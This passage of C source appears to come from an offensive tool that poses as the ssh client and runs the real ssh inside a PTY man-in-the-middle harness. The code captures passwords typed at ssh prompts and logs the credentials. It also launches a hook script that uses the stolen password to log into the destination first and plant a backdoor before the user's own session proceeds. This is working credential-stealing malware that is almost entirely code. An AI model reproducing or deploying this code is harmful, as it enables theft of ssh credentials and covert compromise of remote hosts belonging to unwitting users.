				timeout_update(THC_TO_WAIT_FINISH_AFTER_EXIT_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
			}
		}

		if (XFD_ISSET(fd_i, &rfd))
		{
			int ret;
			ret = infiltrate_read();
			if ((ret != 0) && (fd_pty < 0))
				break;
		}

		if (XFD_ISSET(fd_package, &rfd))
		{
			if (readtoIO(fd_package, &io_i, NULL, NULL) != 0)
			{
				// Keep fd_i open until THCFINISH is received.
				DEBUGF("fd_package is DONE\n");
				g_is_pty_pause = false;
				XCLOSE(fd_package);
				pty_ssh_start();
			}
		}

		if (XFD_ISSET(fd_i, &wfd))
		{
			if (IO_flush(&io_i) != 0)
			{
				infiltrate_done();
			}
		}
	}

	return;
err:
	exit(255);
}

static void
cb_io(void *io_ptr, int ev_id, void *arg)
{
	IO *io = (IO *)io_ptr;
	if (io->fd != fd_i)
		return;

	// DEBUGF_B("EV_ID=%d\n", ev_id);
	if (ev_id == IO_EV_WRITE_BLOCKING)
	{
		is_fd_i_blocking = true;
		// Stop reading from filename
	} else if (ev_id == IO_EV_WRITE_SUCCESS) {
		is_fd_i_blocking = false;
		// Start reading again from filename
	} else {
		// ERROR
	}
}

static void
cb_io_ssh(void *io_ptr, int ev_id, void *arg)
{
	IO *io = (IO *)io_ptr;
	if (io->fd != fd_pty)
		return;

	if (ev_id != IO_EV_ERROR)
	{
		DEBUGF_R("Non-Blocking events should not happen for blocking fd_pty: %d\n", ev_id);
		return;
	}

	DEBUGF_R("Closing fd_pty=%d\n", fd_pty);
	// HERE: EV_ERROR. write() to real ssh failed.
	IO_free(io);
	XCLOSE(fd_pty);
}

// Exec a separate process and try to infiltrate.
// Wait max fo 'timeout' seconds
// before terminating or if timeout == 0 then try in background.
// Block STDIN/STDOUT of pty until infiltration is a success.
static void
infiltrate_ssh(void)
{
	DEBUGF("INFILTRATING....\n");
	char buf[1024];

	setenv("THC_SSH_PARAM", g.ssh_param, 1);
	setenv("THC_SSH_DEST", g.ssh_destination, 1);
	setenv("THC_BASEDIR_REL", g.basedir_rel, 1);
	setenv("THC_BASEDIR_LOCAL", g.basedir_local, 1);
	snprintf(buf, sizeof buf, "%d", g.port);
	setenv("THC_PORT", buf, 1);
	setenv("THC_SSH_HOST", g.host?:"", 1);
	setenv("THC_SSH_USER", g.login_name?:"", 1);
	setenv("THC_SSH_KF", g.keyfile?:"", 1);

	snprintf(buf, sizeof buf, "%s/hook.sh", g.basedir_local);
	char *cmd[] = {buf, NULL};

	fd_i = pty_cmd(&pid_i, cmd[0], g.ps_name, cmd);
	fcntl(fd_i, F_SETFL, O_NONBLOCK | fcntl(fd_i, F_GETFL, 0));
	IO_init(&io_i, fd_i, cb_io, NULL);
	// Set pty to RAW so we can transfer 8-bit binary (package.2gz) via fd_i
	stty_set_pwd(fd_i);
	DEBUGF("infiltrate pid=%d, fd_i=%d\n", pid_i, fd_i);

	LNBUF_init(&lnb_i, 120, fd_i /*id*/, cb_lnbuf_infiltrate_ssh, NULL);

	timeout_update(THC_TO_WAIT_CONNECT_MSEC, THC_EXP_STATE_WAIT_CONNECT, THC_EXP_ACTION_UNPAUSE);
}

// Real ssh has logged in
static void
set_state_real_ssh_logged_in(void)
{
	DEBUGF("ENTER %s\n", __func__);
	g_is_logged_in = 1;
	g_is_pty_pause = false;

	// Successfully logged in. Log credentials.
	log_ssh_credentials();
}

static void
set_state_password_captured(char *pwd)
{
	if (g_is_waiting_at_prompt_i)
	{
		// Send password
		// DEBUGF("Sending password='%s\\n' to infiltrator.\n", pwd);
		IO_write(&io_i, pwd, strlen(pwd));

		// If this is the wrong password then ssh will take 2-3 seconds to reply with
		// "Permission denied, please try again later". Wait for this or THCPROFILE
		// g_is_pty_pause = false;  # Delay login until THCPROFILE is received
		timeout_update(THC_TO_WAIT_PASSWORD_AUTH_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_UNPAUSE);
		g_is_waiting_at_prompt_i = false;
	} else {
		g_is_pty_pause = true;
	}

	XFREE(g.password);
	g.password = strdup(pwd);
}

static bool
strstr_password(char *str)
{
	// can be 'Password' or 'password'
	if ((strstr(str, "passphrase") != NULL) || (strstr(str, "assword") != NULL))
		return true;

	// DEBUGF_C("false=%s\n", str);
	return false;
}

// Check if password has been received _after_ encountering password prompt on PTY.
static char *
ln_check_pwd(LNBUF *user, LNBUF *pty)
{
	if (strstr_password(LNBUF_str(pty))) // check real PTY buffer
		return LNBUF_str(user); // return user input

	return NULL; // real PTY buffer was not asking for a password.
}

// Output from REAL ssh (ln_pty) _and_ user's terminal (ln_in)
static void
cb_lnbuf(void *lptr, void *arg_UNUSED)
{
	LNBUF *l = (LNBUF *)lptr;
	static int output_after_password_count;

	if (g_is_logged_in)
		return;

	// Check user input (full line received)
	if (l == &g.ln_in)
	{
		// HERE: input from USER (not from ssh)
		// if (fd_i < 0)
		// 	return; // infiltrater not running

		char *password = ln_check_pwd(&g.ln_in, &g.ln_pty);
		if (password != NULL)
		{
			// Received password.
			n_passwords += 1;
			DEBUGF_W("PASSWORD CANDIDATE (%d/%d): '%s' (g_is_pty_pause=%s)\n", n_prompts, n_passwords, LNBUF_line(&g.ln_in), g_is_pty_pause?"true":"false");

			if (fd_i >= 0)
			{
				// INFILTRATOR running...
				// Pause real ssh until next password prompt, timeout or THCPROFILE
				g_is_pty_pause = true;
				g_is_skip_line = true;
				IO_pause(&io_ssh);
			}

			set_state_password_captured(password);
			DEBUGF_C("g_is_pty_pause=%s\n", g_is_pty_pause?"true":"false");
			output_after_password_count = 0;
		}

		return;
	}

	if (l == &g.ln_pty)
	{
		// HERE: Output from real SSH (not User)

		// Do same Kama Sutra to determine if login was a success:
		// - Check number ssh's output lines followed by entering password.
		// - Logged in unless output line is 'Permission denied'.
		if (strstr(LNBUF_str(&g.ln_pty), "ermission denied") != NULL)
		{
			// user@127.0.0.1: Permission denied (publickey,password).
			// Permit 1 error line
			output_after_password_count = 0;
		}
		if (strstr(LNBUF_str(&g.ln_pty), "tication failures") != NULL)
		{
			// Permit 1 error line
			output_after_password_count = 0;
		}
		if (strncmp(LNBUF_str(&g.ln_pty), "Disconnected", strlen("Disconnected")) == 0)
		{
			// Permit 1 error line
			output_after_password_count = 0;
		}
		if (strstr(LNBUF_str(&g.ln_pty), "authenticity") != NULL)
			output_after_password_count = 0;
		if (strstr(LNBUF_str(&g.ln_pty), "fingerprint") != NULL)
			output_after_password_count = 0;

		DEBUGF("R:  ssh='%s'\n", LNBUF_line(&g.ln_pty));
		// First line we get is the actual 'Password' prompt (after hitting 'enter').
		output_after_password_count += 1;
		// If the 2nd line is _not_ a password prompt then assume we are logged in successfully.
		if (output_after_password_count >= 5)
			set_state_real_ssh_logged_in();
	}
}

// Output from infiltrating ssh (is in line mode?)
static void
cb_lnbuf_infiltrate_ssh(void *lptr, void *arg_UNUSED)
{
	LNBUF *l = (LNBUF *)lptr;

	DEBUGF("%0.06f I: HOOK='%s' (stage=%d)\n", (double)(THC_usec() - g_usec_start) / (1000 * 1000), LNBUF_line(l), stage_i);

	// Any full line means it can not be a password prompt (because 
	// password prompts never end with '\n'
	g_is_waiting_at_prompt_i = false;
	g_is_prompt_waiting_newline_i = false;

	int ret;
	ret = match_stage_inside(LNBUF_str(l));
	if ((ret == false) && (stage_i < THC_STAGE_I_INSIDE))
	{
		// HERE: _NOT_ THCINSIDE

		// Any output but THCINSIDE and we treat it as continue.
		// Such output could be "Perission denied, please try again" but also
		// THCPROFILE. In either case we need to continue real ssh.

		if (g_is_skip_line == false)
		{
			// We only see the '%bob@127.0.0.1's password: ' here after we send the password
			// to the infiltrator. Do not enable IO yet but wait for THCPROFILE
			// or any other line such as 'Permission denied, please ..'.
			IO_unpause(&io_ssh);
			g_is_pty_pause = false;
		} else {
			// DEBUGF_Y("Skipping this line. NOT unpausing io_ssh\n");
			g_is_skip_line = false;
		}
	}
	match_stage_profile(LNBUF_str(l));
}

// Start real SSH
static void
pty_ssh_start(void)
{
	// Return if already started.
	if (g_is_pty_ssh_start)
		return;
	g_is_pty_ssh_start = true;

	// Dont need the line buffer if infiltrator login was success (e.g. THCINSIDE)
	// This can happen when not asked for a password at all (key-auth)
	if (stage_i < THC_STAGE_I_INSIDE)
	{
		LNBUF_init(&g.ln_pty, 256, fd_pty, cb_lnbuf, &g.ln_pty);
		LNBUF_init(&g.ln_in, 256, STDIN_FILENO, cb_lnbuf, &g.ln_in);
	}

	// Start original ssh in a PTY-harness
	fd_pty = pty_cmd(&pid_ssh, g.target_file, g.target_name, g_argv);
	DEBUGF("real pid=%d, fd_pty=%d\n", pid_ssh, fd_pty);
	IO_init(&io_ssh, fd_pty, cb_io_ssh, NULL);
	IO_init(&io_out, STDOUT_FILENO, NULL, NULL);

	// Set STDIN to RAW (and become a pass-through PTY)
	stty_set_passthrough(STDIN_FILENO, &g_tios_saved);
	g_is_tios_saved = true;
}


static int
db_update(const char *dbname)
{
	char buf[4096];
	FILE *fp;
	snprintf(buf, sizeof buf, "%s/db-%s-%s.%s", g.db_basedir, g.target_name, g_host_id, dbname);

	fp = fopen(buf, "w");
	if (fp == NULL)
	{
		DEBUGF_R("ERROR: fopen(%s): %s\n", buf, strerror(errno));
		return -1;
	}

	fprintf(fp, "%ld\n", time(NULL));
	fclose(fp);

	return 0;
}

// Return TRUE if dbname is older than sec seconds.
// Return FALSE on error
static bool
db_check_expired(const char *dbname, int sec)
{
	char buf[4096];
	struct stat s;
	long int now_sec;
	bool ret;

	now_sec = time(NULL);

	// Check when we tried last. If we tried recently then dont try again.
	snprintf(buf, sizeof buf, "%s/db-%s-%s.%s", g.db_basedir, g.target_name, g_host_id, dbname);
	ret = stat(buf, &s);
	// File does not exist. Thus we shall TRY to create it...
	if (ret == 0)
	{
		if (s.st_mtime + sec >= now_sec)
		{
			DEBUGF_Y("SKIP %s. Tried %ld seconds ago. Expire in %ld sec\n", dbname, now_sec - s.st_mtime, s.st_mtime + sec - now_sec);
			return false;
		}
	}

	return true; // File does not exists or has expired.
}

static bool
is_need_infiltrate(void)
{
	bool ret;

	if (g_is_ssh == true)
	{

		// Check when we tried last. If we tried recently then dont try again.
		ret = db_check_expired("try", g_db_trysec);
		if (ret == false)
			return false;
		if (db_update("try") != 0)
			return false;

		ret = db_check_expired("inf", g.recheck_time);
		if (ret == false)
			return false;

		return true;
	}

	return false;
}

static void
print_random()
{
	srandom(THC_usec());
	printf("%ld\n", random());
	exit(0);
}

int
main(int argc, char *argv[])
{
	// During deployment we use this to check that this binary is executeable
	if (getenv("THC_EXEC_TEST") != NULL)
		exit(0);

	if (getenv("THC_GET_RANDOM") != NULL)
		print_random();

	init_vars(&argc, &argv);

	// If this is not a PTY then replace current process immediately
	if (!isatty(STDIN_FILENO))
		nopty_exec(argv);  // Does not return

	// Execute original binary
	if (getenv("THC_REALTARGET") != NULL)
		nopty_exec(argv);

	// Check if the ssh session needs sniffing
	// If we do not want to log session and we do not need sniffing
	// then just execute target binary without pty-MITM.
	if (!is_need_sniffing(argc , argv))
		nopty_exec(argv); // Does not return

	// No destination host specified. ('ssh -h' for example...)
	// if (g.ssh_destination == NULL)f
		// nopty_exec(argv);

	if (is_need_infiltrate())
	{
		// start infiltrate _before_ original ssh to give time
		// to backdoor before original ssh logs in.
		infiltrate_ssh();
	} else {
		pty_ssh_start();
	}

	io_loop();

	DEBUGF("AFTER io_loop()\n");
	// Shutdown & Exit
	if (g_is_tios_saved)
		tcsetattr(STDIN_FILENO, TCSADRAIN, &g_tios_saved);
	
	// Deal with target process being killed by ctrl-c (so that exit code of pty intercept
	// is set correctly)
	int wstatus = 0;
	int exit_code = 0;
	if (waitpid(pid_ssh, &wstatus, /*WNOHANG*/0) == pid_ssh)
	{
		if (WIFEXITED(wstatus))
		{
			exit_code = WEXITSTATUS(wstatus);
			if (exit_code == 0)
			{
				// HERE: ssh login had no output but exited sucessfully.
				// Log credentials.
				log_ssh_credentials();
			}
		}
		// Kill myself with the same signal with which the child was killed.
		if (WIFSIGNALED(wstatus))
		{
			DEBUGF("PID %d killed by signal %d\n", pid_ssh, WTERMSIG(wstatus));
			// fd_log and fd_log_in might be identical if logging to same file.
			if (g.fd_log != g.fd_log_in)
				XCLOSE(g.fd_log_in);
			else
				g.fd_log_in = -1;
			XCLOSE(g.fd_log);
			kill(getpid(), WTERMSIG(wstatus));
		}
	}

	XCLOSE(g.fd_log);

	exit(exit_code);
	// NOT REACHED
}
